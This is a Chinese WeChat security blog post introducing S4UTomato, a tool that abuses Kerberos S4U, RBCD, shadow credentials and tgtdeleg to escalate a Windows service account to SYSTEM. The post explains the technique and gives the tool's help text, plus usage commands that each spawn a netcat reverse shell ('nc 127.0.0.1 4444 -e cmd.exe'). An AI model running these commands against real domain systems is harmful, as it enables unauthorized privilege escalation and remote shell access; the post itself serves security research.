#  【工具】利用 Kerberos 将服务帐户提权至本地系统权限

原创 骨哥说事 [ 骨哥说事 ](javascript:void\(0\);)

**骨哥说事** ![]()

微信号 guge_guge

功能介绍 关注信息安全趋势，发布国内外网络安全事件，不定期发布对热点事件的个人见解。

____

___发表于_

收录于合集

#工具 42 个

#提权 1 个

#白帽故事 116 个

# ****声明：****
文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。  
  
---  
  
#  **  
**

#  **背景介绍：**

  

熟悉 "Potato"系列提权的朋友应该知道，它可以将服务账户权限提升到本地系统权限。"Potato"的早期利用技术几乎完全相同：利用 COM
接口的某些特性，欺骗 NT AUTHORITY\SYSTEM 账户连接并验证攻击者控制的 RPC 服务器。然后，通过一系列 API
调用，在验证过程中执行中间（NTLM 中继）攻击，从而为本地系统中的 NT AUTHORITY\SYSTEM 账户生成访问令牌。最后，该令牌被窃取，然后使用
CreateProcessWithToken() 或 CreateProcessAsUser() 函数传递令牌并创建一个新进程以获取 SYSTEM 权限。

  

 **  
**

 **关于Kerberos：**

在计算机加入域的任何情况下，只要可以在 Windows 服务帐户或 Microsoft 虚拟帐户中运行代码（前提是没有 Active Directory
），你就可以利用上述技术进行本地权限提权。

  

在 Windows 域环境中，加入域的系统计算机帐户使用 SYSTEM、NT AUTHORITY\NETWORK SERVICE 和 Microsoft
虚拟帐户进行身份验证。因为在现在版本的 Windows 系统中，大多数 Windows 服务默认使用 Microsoft 虚拟帐户运行，值得注意的是，IIS
和 MSSQL
使用这些虚拟帐户，其他应用程序也可能会使用它们，因此，我们可以利用S4U扩展来获取本机上域管理员帐户“Administrator”的服务票据，然后，在
James Forshaw (@tiraniddo) 的 SCMUACBypass 的帮助下，使用该票证创建系统服务获得 SYSTEM
权限，这实现了与“Potato”系列提权技术中使用的传统方法相同的效果。

在这之前，需要先获取本地机器帐户的TGT（Ticket Granting
Ticket），这并不容易，因为服务帐户权限施加的限制会无法获取计算机的长期密钥，从而无法构造 KRB_AS_REQ
请求，为了实现以上目标，本工具利用了三种技术：Resource-based Constrained Delegation, Shadow
Credentials, and Tgtdeleg，作者基于 Rubeus 工具集构建了该项目。

 **使用方法：**  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     C:\Users\whoami\Desktop>S4UTomato.exe --help  
    S4UTomato 1.0.0-betaCopyright (c) 2023  
      -d, --Domain              Domain (FQDN) to authenticate to.  -s, --Server              Host name of domain controller or LDAP server.  -m, --ComputerName        The new computer account to create.  -p, --ComputerPassword    The password of the new computer account to be created.  -f, --Force               Forcefully update the 'msDS-KeyCredentialLink' attribute of the computer                            object.  -c, --Command             Program to run.  -v, --Verbose             Output verbose debug information.  --help                    Display this help screen.  --version                 Display version information.

  

利用 Resource-based Constrained Delegation的LEP：

  * 

    
    
    S4UTomato.exe rbcd -m NEWCOMPUTER -p pAssw0rd -c "nc.exe 127.0.0.1 4444 -e cmd.exe"

![]()

利用 Shadow Credentials + S4U2self的LEP：

  * 

    
    
    S4UTomato.exe shadowcred -c "nc 127.0.0.1 4444 -e cmd.exe" -f

  

利用 Tgtdeleg + S4U2self的LEP：

  *   *   *   * 

    
    
    # First retrieve the TGT through TgtdelegS4UTomato.exe tgtdeleg# Then run SCMUACBypass to obtain SYSTEM privilegeS4UTomato.exe krbscm -c "nc 127.0.0.1 4444 -e cmd.exe"

 **  
**

工具地址： **https://github.com/wh0amitz/S4UTomato**

 ** **====正文结束====****

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

